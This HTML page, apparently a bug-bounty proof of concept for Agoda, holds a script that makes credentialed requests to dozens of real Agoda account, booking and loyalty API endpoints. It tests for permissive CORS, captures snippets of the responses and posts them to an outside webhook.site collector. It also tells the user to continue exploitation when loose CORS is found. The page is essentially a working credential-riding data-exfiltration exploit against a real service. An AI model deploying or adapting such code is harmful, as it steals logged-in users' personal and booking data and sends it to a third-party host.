<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Agoda CORS Mass Test</title>
    <style>
        body { font-family: Arial, sans-serif; padding: 20px; background: #f5f5f5; }
        .container { max-width: 900px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; }
        table { width: 100%; border-collapse: collapse; font-size: 13px; }
        th, td { padding: 8px 12px; border: 1px solid #ddd; text-align: left; }
        th { background: #4CAF50; color: white; }
        .success { background: #e8f5e9; }
        .error { background: #ffebee; }
        .unknown { background: #fff3e0; }
        pre { background: #1e1e1e; color: #d4d4d4; padding: 10px; border-radius: 4px; overflow: auto; max-height: 300px; font-size: 11px; }
        .summary { padding: 10px; margin: 10px 0; border-radius: 4px; }
        .summary.success { background: #c8e6c9; border: 1px solid #4CAF50; }
        .summary.fail { background: #ffcdd2; border: 1px solid #f44336; }
        .badge { display: inline-block; padding: 2px 8px; border-radius: 12px; color: white; font-size: 11px; }
        .badge.allow { background: #4CAF50; }
        .badge.deny { background: #f44336; }
        .badge.null { background: #ff9800; }
    </style>
</head>
<body>
<div class="container">
    <h1>🔍 Agoda CORS Mass Test</h1>
    <p><strong>Identifier:</strong> hackerone-mz_</p>
    <p><strong>Host:</strong> <span id="hostname"></span></p>
    <div id="summary" class="summary">⏳ Menguji endpoint...</div>
    <div id="result"><p>⏳ Mengirim request ke semua endpoint...</p></div>
</div>

<script>
    // ================================================================
    // CORS MASS TEST - Agoda
    // Identifier: hackerone-mz_
    // ================================================================

    const WEBHOOK = 'https://webhook.site/e25f3018-8e6f-4ac7-abd2-7fddb4ea00fd';
    document.getElementById('hostname').textContent = window.location.hostname;

    // ======== DAFTAR ENDPOINT ========
    const endpoints = [
        '/api/cronos/layout/PageHeaderApi/UserMenuViewModel',
        '/api/cronos/layout/login/params',
        '/api/cronos/pointsmax/getmemberprograms',
        '/api/cronos/partnermember/partnerdata',
        '/api/cronos/favorite/',
        '/api/cronos/layout/notification/get',
        '/api/cronos/seo/base',
        '/api/cronos/home/GetHomeContents',
        '/api/cronos/home/GetTopDestinations',
        '/api/cronos/home/GetTimeSaleContent',
        '/api/cronos/layout/culture/getlanguages',
        '/api/cronos/layout/currency/getlist',
        '/api/cronos/geo/country/getgenericinfo?ObjectId=1',
        '/api/cronos/search/GetUnifiedSuggestResult/3/1/1/0/',
        '/api/cronos/search/GetUnifiedSuggestResult/3/1/1/0/en-us/',
        '/api/cronos/search/npc/GetFilterResult',
        '/api/cronos/search/getplaceRecommendation',
        '/api/cronos/search/npc/area/info',
        '/api/cronos/property/review/GetPendingReviewsCount',
        '/api/cronos/property/review/HotelReviews',
        '/api/cronos/property/review/ReviewComments',
        '/api/cronos/property/review/TranslateReview',
        '/api/cronos/property/review/TranslateReviewResponse',
        '/api/cronos/property/Recommendation/RecommendedProperties',
        '/api/cronos/loyaltyexternal/insertmembership',
        '/api/cronos/loyaltyexternal/updatemembership',
        '/api/cronos/favorite/addfavoritehotel',
        '/api/cronos/property/review/SaveHelpfulComment',
        '/api/cronos/pointsmax/savepointsmax',
        '/api/cronos/layout/currency/set',
        '/api/review/get-last-pending-review',
        '/api/saved/retrieve',
        '/api/card/campaigns',
        '/api/personalization',
        '/api/account/profile',
        '/api/account/settings',
        '/api/user/profile',
        '/api/booking/list',
        '/api/booking/history',
        '/api/v1/profile',
        '/api/v1/bookings',
        '/api/v1/settings',
        '/api/v1/user',
        '/graphql',
        '/api/flights-bff/search/v1/flights',
        '/api/flights-bff/search/v1/itinerary',
        '/api/flights-bff/content/v1/location',
        '/api/flights-bff/calendar/v1/prices',
        '/api/cronos/layout/PageHeaderApi/UserMenuViewModel'
    ];

    // Hapus duplikat
    const uniqueEndpoints = [...new Set(endpoints)];

    // ======== FUNGSI TEST ========
    const results = [];
    let completed = 0;

    async function testEndpoint(url) {
        const start = Date.now();
        try {
            const res = await fetch('https://www.agoda.com' + url, {
                credentials: 'include',
                headers: { 'User-Agent': 'hackerone-mz_' }
            });
            const origin = res.headers.get('access-control-allow-origin');
            const creds = res.headers.get('access-control-allow-credentials');
            const text = await res.text();
            const data = text.length > 200 ? text.substring(0, 200) + '...' : text;
            return {
                url,
                status: res.status,
                origin,
                creds,
                data,
                time: Date.now() - start,
                ok: true,
                cors: origin === 'null' || origin === '*' ? 'allow' : (origin ? 'echo' : 'none')
            };
        } catch (err) {
            return {
                url,
                status: 0,
                origin: null,
                creds: null,
                data: err.message,
                time: Date.now() - start,
                ok: false,
                cors: 'blocked'
            };
        }
    }

    async function runTests() {
        const resultDiv = document.getElementById('result');
        const summaryDiv = document.getElementById('summary');

        // Buat tabel
        let html = `<table>
            <thead><tr>
                <th>#</th>
                <th>Endpoint</th>
                <th>Status</th>
                <th>CORS-Origin</th>
                <th>CORS-Credentials</th>
                <th>CORS</th>
                <th>Data</th>
            </tr></thead><tbody>`;

        let allowCount = 0;
        let blockCount = 0;
        let echoCount = 0;

        for (let i = 0; i < uniqueEndpoints.length; i++) {
            const url = uniqueEndpoints[i];
            const result = await testEndpoint(url);
            results.push(result);

            let corsBadge = '';
            if (result.cors === 'allow') {
                corsBadge = `<span class="badge allow">✔ ALLOW</span>`;
                allowCount++;
            } else if (result.cors === 'echo') {
                corsBadge = `<span class="badge null">↪ ECHO</span>`;
                echoCount++;
            } else {
                corsBadge = `<span class="badge deny">✖ BLOCKED</span>`;
                blockCount++;
            }

            const rowClass = result.cors === 'allow' ? 'success' : (result.cors === 'blocked' ? 'error' : 'unknown');
            html += `<tr class="${rowClass}">
                <td>${i+1}</td>
                <td><code>${url}</code></td>
                <td>${result.status}</td>
                <td>${result.origin || '-'}</td>
                <td>${result.creds || '-'}</td>
                <td>${corsBadge}</td>
                <td><pre style="max-height:60px;font-size:10px;">${result.data}</pre></td>
            </tr>`;

            // Update progress
            completed++;
            resultDiv.innerHTML = html + `</tbody></table>`;
            summaryDiv.innerHTML = `
                <p><strong>Progress:</strong> ${completed}/${uniqueEndpoints.length}</p>
                <p>✔ ALLOW: ${allowCount} | ↪ ECHO: ${echoCount} | ✖ BLOCKED: ${blockCount}</p>
            `;

            // Kirim ke webhook setiap 10 endpoint
            if (i % 10 === 0) {
                fetch(WEBHOOK, {
                    method: 'POST',
                    mode: 'no-cors',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        identifier: 'hackerone-mz_',
                        timestamp: new Date().toISOString(),
                        host: window.location.hostname,
                        progress: `${completed}/${uniqueEndpoints.length}`,
                        results: results.slice(-10)
                    })
                });
            }
        }

        html += `</tbody></table>`;
        resultDiv.innerHTML = html;

        // Ringkasan akhir
        summaryDiv.className = `summary ${allowCount > 0 ? 'success' : 'fail'}`;
        summaryDiv.innerHTML = `
            <h2>📊 HASIL AKHIR</h2>
            <p><strong>Total endpoint:</strong> ${uniqueEndpoints.length}</p>
            <p><strong>✔ ALLOW (CORS longgar):</strong> ${allowCount} ${allowCount > 0 ? '🔥' : ''}</p>
            <p><strong>↪ ECHO (origin reflected):</strong> ${echoCount}</p>
            <p><strong>✖ BLOCKED:</strong> ${blockCount}</p>
            ${allowCount > 0 ? '<p class="success">✅ Ada endpoint dengan CORS longgar! Lanjutkan eksploitasi.</p>' : '<p class="error">❌ Tidak ada CORS longgar pada endpoint yang diuji.</p>'}
        `;

        // Kirim hasil akhir ke webhook
        fetch(WEBHOOK, {
            method: 'POST',
            mode: 'no-cors',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                identifier: 'hackerone-mz_',
                timestamp: new Date().toISOString(),
                host: window.location.hostname,
                summary: { total: uniqueEndpoints.length, allow: allowCount, echo: echoCount, blocked: blockCount },
                results: results
            })
        });
    }

    // Jalankan
    runTests();
</script>
</body>
</html>
